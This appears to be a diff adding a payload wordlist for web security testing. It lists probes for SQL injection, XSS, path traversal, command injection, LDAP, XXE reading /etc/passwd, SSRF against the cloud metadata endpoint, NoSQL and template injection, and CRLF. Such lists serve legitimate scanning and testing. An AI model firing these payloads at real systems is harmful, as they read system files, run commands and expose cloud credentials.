@@ -1,0 +1,48 @@
+# SQL Injection
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' /*
+admin' --
+' UNION SELECT NULL--
+1' UNION SELECT NULL,NULL--
+
+# XSS
+<script>alert('XSS')</script>
+<img src=x onerror=alert(1)>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<svg/onload=alert('XSS')>
+
+# Path Traversal
+../../../etc/passwd
+..\..\..\..\windows\system32\drivers\etc\hosts
+....//....//....//etc/passwd
+
+# Command Injection
+; ls -la
+| whoami
+`id`
+& ipconfig
+
+# LDAP Injection
+*)(uid=*))(|(uid=*
+admin*)((|userPassword=*)
+
+# XXE
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+# SSRF
+http://localhost/admin
+http://127.0.0.1/admin
+http://169.254.169.254/latest/meta-data/
+
+# NoSQL Injection
+{"$gt":""}
+{"$ne":null}
+
+# Template Injection
+{{7*7}}
+${7*7}
+<%= 7*7 %>
+
+# CRLF Injection
+%0d%0aSet-Cookie:admin=true
